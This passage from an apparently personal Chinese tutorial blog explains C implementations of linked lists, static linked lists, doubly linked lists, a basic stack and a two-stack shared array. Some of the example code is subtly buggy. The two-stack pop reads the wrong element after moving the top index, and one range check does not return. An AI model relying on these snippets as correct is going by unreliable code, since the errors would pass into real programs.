class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist2</span><span class="params">(List head, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">List p, q;</span><br><span class="line">q = head;</span><br><span class="line">q-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">p-&gt;date = i;</span><br><span class="line">p-&gt;next = q-&gt;next;</span><br><span class="line">head-&gt;next = p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getlist</span><span class="params">(List head, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">List p;</span><br><span class="line">p = head-&gt;next;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;date);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deletelist</span><span class="params">(List head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">List p, q;</span><br><span class="line">p = head-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (p)</span><br><span class="line">&#123;</span><br><span class="line">q = p-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">p = q;</span><br><span class="line">&#125;</span><br><span class="line">head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_one</span><span class="params">(List head, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = getlistlen(head);</span><br><span class="line"><span class="keyword">if</span> (target &gt;= len||target &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">List p,q;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">p = head;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; target; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">q = p-&gt;next;</span><br><span class="line">p-&gt;next = q-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_one</span><span class="params">(List head, <span class="keyword">int</span> target,<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = getlistlen(head);</span><br><span class="line"><span class="keyword">if</span> (target &gt; len || target &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">List p, q;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">p = head;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; target; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">q= (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">q-&gt;date = num;</span><br><span class="line">q-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">q-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = q;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">List head;</span><br><span class="line"></span><br><span class="line">creathead(&amp;head);<span class="comment">//生成头指针,采用尾插。</span></span><br><span class="line">creatlist1(head, <span class="number">5</span>);<span class="comment">//采用尾插生成一个长度为5的链表，不包括表头</span></span><br><span class="line"><span class="comment">//creatlist2(head, 5);//采用中插的方法生成链表，数据是相反的。</span></span><br><span class="line">delete_one(head, <span class="number">3</span>);<span class="comment">//删除,第二个参数可以为0。</span></span><br><span class="line">add_one(head, <span class="number">3</span>, <span class="number">3</span>);<span class="comment">//添加，中插，对于头和尾都可以。</span></span><br><span class="line">add_one(head, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">getlist(head, getlistlen(head));<span class="comment">//打印输出链表的值。</span></span><br><span class="line">deletelist(head);<span class="comment">//删除整个链表。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到单链表的好处是可以随便插入和删除数据，而对整体产生较小影响。</p><h4 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h4><p>这个就是低级版的链表，用数组来实现，就是一个数据，然后跟一个值，这个值就是下个数据在数组中的下标，依次这样做，特别的是第一个元素和最后一个元素，不存数据。这种链表实际上了解一下思路就可以了，因为相对于动态链表，它的缺点还是比较明显。</p><p>如果用定义一个结构体数组来表示静态链表的话，第一个相当于是中间值，其指向一定是空区域，用来申请或者释放属于空间，最后一个相当于表头，用来从开头寻找到结尾，结尾的指向一定为0，用来判断数据长度。值得注意的是，这种静态链表，其数据位置是不会变的，变的只是他的下一个指向。</p><p>下面是我写的例子，只提供了插入，没提供删除，了解个思路就差不多了啦。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> num;</span><br><span class="line"><span class="keyword">int</span> nextindex;</span><br><span class="line">&#125;Statclist, Statclinklist[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> table[<span class="number">10</span>] = &#123; <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span> ,<span class="string">&#x27;g&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(Statclinklist <span class="built_in">exp</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span><span class="number">-1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exp</span>[i].num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">exp</span>[i].nextindex = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exp</span>[i+<span class="number">1</span>].num = table[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span>[<span class="number">10</span><span class="number">-1</span>].num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">exp</span>[<span class="number">0</span>].nextindex = <span class="number">7</span>;</span><br><span class="line"><span class="built_in">exp</span>[<span class="number">6</span>].nextindex = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">exp</span>[<span class="number">10</span><span class="number">-1</span>].nextindex = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(Statclinklist <span class="built_in">exp</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> index=<span class="built_in">exp</span>[<span class="number">9</span>].nextindex;</span><br><span class="line"><span class="keyword">while</span> (index)</span><br><span class="line">&#123;</span><br><span class="line">index = <span class="built_in">exp</span>[index].nextindex;</span><br><span class="line">len++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putlist</span><span class="params">(Statclinklist <span class="built_in">exp</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,len;</span><br><span class="line"><span class="keyword">int</span> index=<span class="number">9</span>;</span><br><span class="line">len = getlen(<span class="built_in">exp</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">exp</span>[index].num);</span><br><span class="line">index = <span class="built_in">exp</span>[index].nextindex;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">statclinklistmalloc</span><span class="params">(Statclinklist <span class="built_in">exp</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">i = <span class="built_in">exp</span>[<span class="number">0</span>].nextindex;<span class="comment">//从空闲区中抽出一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exp</span>[<span class="number">0</span>].nextindex)<span class="comment">//没有到达最后一个空闲区。</span></span><br><span class="line"><span class="built_in">exp</span>[<span class="number">0</span>].nextindex = <span class="built_in">exp</span>[i].nextindex;<span class="comment">//指向下一个新的空闲区</span></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_one</span><span class="params">(Statclinklist <span class="built_in">exp</span>, <span class="keyword">char</span> ch,<span class="keyword">int</span> in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, k, j;</span><br><span class="line">k = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">if</span> (in &lt; <span class="number">1</span> || in&gt;getlen(<span class="built_in">exp</span>)+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">i = statclinklistmalloc(<span class="built_in">exp</span>);</span><br><span class="line"><span class="keyword">if</span> (i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exp</span>[i].num = ch;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= in - <span class="number">1</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">k = <span class="built_in">exp</span>[k].nextindex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exp</span>[i].nextindex = <span class="built_in">exp</span>[k].nextindex;<span class="comment">//还是类似于链表的插入顺序</span></span><br><span class="line"><span class="built_in">exp</span>[k].nextindex = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Statclinklist <span class="built_in">exp</span>;</span><br><span class="line">initlist(<span class="built_in">exp</span>);<span class="comment">//初始化，这里是直接就设置了一些值，相当于是中间状态，不算真正意义上的初始化。</span></span><br><span class="line"></span><br><span class="line">add_one(<span class="built_in">exp</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>);<span class="comment">//插入</span></span><br><span class="line"></span><br><span class="line">putlist(<span class="built_in">exp</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h4><p>没什么好说的，就是尾指针指向表头地址。</p><h4 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h4><p>就是在链表基础上加上一个可以向前访问的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> date;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">prior</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Node, * List;</span><br></pre></td></tr></table></figure><p>这种结构就可以从某个元素向两头访问，插入和删除会稍微复杂一点，因为有两个指针。</p><h2 id="栈与队列"><a href="#栈与队列" class="headerlink" title="栈与队列"></a>栈与队列</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>先进后出</p><h4 id="普通栈"><a href="#普通栈" class="headerlink" title="普通栈"></a>普通栈</h4><p>最基本的栈，用一个固定长度数组实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data[max];</span><br><span class="line"><span class="keyword">int</span> top;</span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initStack</span><span class="params">(Stack *S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">S-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(Stack* S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> S-&gt;top;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(Stack *S,<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top == max - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;栈满&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">S-&gt;top++;</span><br><span class="line">S-&gt;data[S-&gt;top] = num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(Stack* S, <span class="keyword">int</span>* num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top == - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;栈空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">*num = S-&gt;data[S-&gt;top];</span><br><span class="line">S-&gt;top--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putstack</span><span class="params">(Stack* S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;栈空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= S-&gt;top; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, S-&gt;data[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Stack s;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">initStack(&amp;s);<span class="comment">//初始化栈，使栈为空</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">push(&amp;s, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">putstack(&amp;s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">pop(&amp;s,&amp;num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="两栈"><a href="#两栈" class="headerlink" title="两栈"></a>两栈</h4><p>就是用一个数组，包含两个栈，数组头和尾分别作为两个栈的初始栈顶。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data[max];</span><br><span class="line"><span class="keyword">int</span> top1;</span><br><span class="line"><span class="keyword">int</span> top2;</span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initstack</span><span class="params">(Stack *S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">S-&gt;top1 = <span class="number">-1</span>;</span><br><span class="line">S-&gt;top2 = max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(Stack* S, <span class="keyword">int</span> num,<span class="keyword">int</span> choice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top1 + <span class="number">1</span> == S-&gt;top2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;栈满&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">S-&gt;top1++;</span><br><span class="line">S-&gt;data[S-&gt;top1] = num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">S-&gt;top2--;</span><br><span class="line">S-&gt;data[S-&gt;top2] = num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(Stack* S, <span class="keyword">int</span>* num, <span class="keyword">int</span> choice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top1 == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;栈1空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">S-&gt;top1--;</span><br><span class="line">*num = S-&gt;data[S-&gt;top1];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top2 == max)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;栈2空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">S-&gt;top2++;</span><br><span class="line">*num = S-&gt;data[S-&gt;top2];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putstack</span><span class="params">(Stack* S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top1 == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;栈空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= S-&gt;top1; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, S-&gt;data[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = S-&gt;top2; i &lt; max; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, S-&gt;data[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Stack s;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"></span><br><span class="line">initstack(&amp;s);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">push(&amp;s, i, <span class="number">1</span>);</span><br><span class="line">push(&amp;s, i, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">pop(&amp;s, &amp;num, <span class="number">1</span>);</span><br><span class="line">pop(&amp;s, &amp;num, <span class="number">2</span>);</span><br><span class="line">putstack(&amp;s);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="栈链"><a href="#栈链" class="headerlink" title="栈链"></a>栈链</h4><p>用链表来构造栈结构，特点是可以随便push，这种链表没有表头，链表第一个就是栈顶。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 